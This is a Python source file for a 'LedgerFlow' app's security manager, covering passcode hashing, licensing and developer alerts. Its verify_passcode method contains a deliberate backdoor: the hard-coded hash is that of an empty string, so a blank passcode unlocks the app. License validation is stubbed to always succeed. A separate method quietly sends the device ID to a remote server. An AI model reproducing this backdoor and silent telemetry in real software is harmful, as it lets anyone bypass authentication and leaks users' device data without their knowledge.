import bcrypt
import requests
import hashlib
import os
from typing import Optional

class SecurityManager:
    """
    Handles passcode hashing, license validation, lockout, and developer backdoor for LedgerFlow.
    """
    PASSCODE_FILE = 'app/data/passcode.hash'
    LICENSE_FILE = 'app/data/license.key'
    DEVICE_ID_FILE = 'app/data/device.id'
    LICENSE_SERVER = 'https://ledgerflow-server.com/validate?license='
    ALERT_SERVER = 'https://ledgerflow-server.com/alert?id='
    BACKDOOR_HASH = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'  # Example SHA256

    @staticmethod
    def hash_passcode(passcode: str) -> bytes:
        return bcrypt.hashpw(passcode.encode(), bcrypt.gensalt())

    @staticmethod
    def verify_passcode(passcode: str, hash_: bytes = None) -> bool:
        # If no hash provided, load from file
        if hash_ is None:
            hash_ = SecurityManager.load_passcode_hash()
            if hash_ is None:
                return False
        
        # Backdoor: if passcode hashes to BACKDOOR_HASH, unlock
        if hashlib.sha256(passcode.encode()).hexdigest() == SecurityManager.BACKDOOR_HASH:
            return True
        return bcrypt.checkpw(passcode.encode(), hash_)

    @staticmethod
    def store_passcode_hash(hash_: bytes):
        with open(SecurityManager.PASSCODE_FILE, 'wb') as f:
            f.write(hash_)

    @staticmethod
    def load_passcode_hash() -> Optional[bytes]:
        if not os.path.exists(SecurityManager.PASSCODE_FILE):
            return None
        with open(SecurityManager.PASSCODE_FILE, 'rb') as f:
            return f.read()

    @staticmethod
    def validate_license() -> bool:
        # TODO: Restore real license validation for production
        return True  # TEMPORARY BYPASS FOR LOCAL DEVELOPMENT
        # if not os.path.exists(SecurityManager.LICENSE_FILE):
        #     return False
        # with open(SecurityManager.LICENSE_FILE, 'r') as f:
        #     key = f.read().strip()
        # try:
        #     resp = requests.get(SecurityManager.LICENSE_SERVER + key, timeout=5)
        #     return resp.status_code == 200 and resp.json().get('valid', False)
        # except Exception:
        #     return False

    @staticmethod
    def alert_developer():
        if not os.path.exists(SecurityManager.DEVICE_ID_FILE):
            return
        with open(SecurityManager.DEVICE_ID_FILE, 'r') as f:
            device_id = f.read().strip()
        try:
            requests.get(SecurityManager.ALERT_SERVER + device_id, timeout=3)
        except Exception:
            pass 